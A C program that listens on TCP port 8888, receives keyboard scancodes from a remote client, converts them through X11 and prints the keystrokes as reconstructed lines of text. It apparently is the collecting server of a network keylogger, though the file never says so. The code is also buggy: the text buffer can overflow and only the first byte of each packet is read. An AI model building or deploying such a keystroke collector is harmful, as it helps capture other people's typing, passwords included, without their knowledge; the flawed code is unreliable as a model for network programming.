#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <X11/Xlib.h>
#include <X11/Xlib-xcb.h>

#define SERVER_PORT 8888
#define BUFFER_SIZE 1024

int main()
{
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(SERVER_PORT);

    // Bind socket to the server address
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("Failed to bind socket");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(sockfd, 1) < 0)
    {
        perror("Failed to listen for connections");
        exit(EXIT_FAILURE);
    }

    printf("Receiver is listening on port %d\n", SERVER_PORT);

    while (1)
    {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_sockfd;
        int size;

        // Accept incoming connection
        client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
        if (client_sockfd < 0)
        {
            perror("Failed to accept connection");
            exit(EXIT_FAILURE);
        }

        printf("Received a connection from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        // Receive data
        while ((size = recv(client_sockfd, buffer, BUFFER_SIZE, 0)) > 0)
        {
            // Process received data
            KeyCode pc = (KeyCode)buffer[0] + 8;
            Display *dpy = XOpenDisplay(NULL);

            static char received_string[BUFFER_SIZE];
            static int string_length = 0;

            KeySym keysym = XKeycodeToKeysym(dpy, pc, 0);
            char *converted = XKeysymToString(keysym);

            // Valid character
            if (converted != NULL)
            {
                // If enter pressed, print the received string
                if (buffer[0] == 28)
                {
                    printf("%s\n", received_string);
                    strcpy(received_string, "");
                    string_length = 0;
                }
                else if (buffer[0] == 57)
                {
                    strncpy(received_string + string_length, " ", BUFFER_SIZE - string_length - 1);
                    string_length ++;
                    received_string[string_length] = '\0'; // Add null-terminating character
                }
                else if (strlen(converted) == 1)
                {
                    // Copy the converted character(s) to the received_string buffer
                    strncpy(received_string + string_length, converted, BUFFER_SIZE - string_length - 1);
                    string_length ++;
                    received_string[string_length] = '\0'; // Add null-terminating character
                }
                else
                {
                    if (strlen(received_string) > 0)
                    {
                        printf("%s\n", received_string);
                        strcpy(received_string, "");
                        string_length = 0;
                    }

                    printf("[%s]\n", converted);
                }
            }

            XCloseDisplay(dpy);
        }

        if (size < 0)
        {
            perror("Failed to receive data");
            exit(EXIT_FAILURE);
        }

        printf("Connection closed\n");
        close(client_sockfd);
    }

    // Close the socket
    close(sockfd);

    return 0;
}
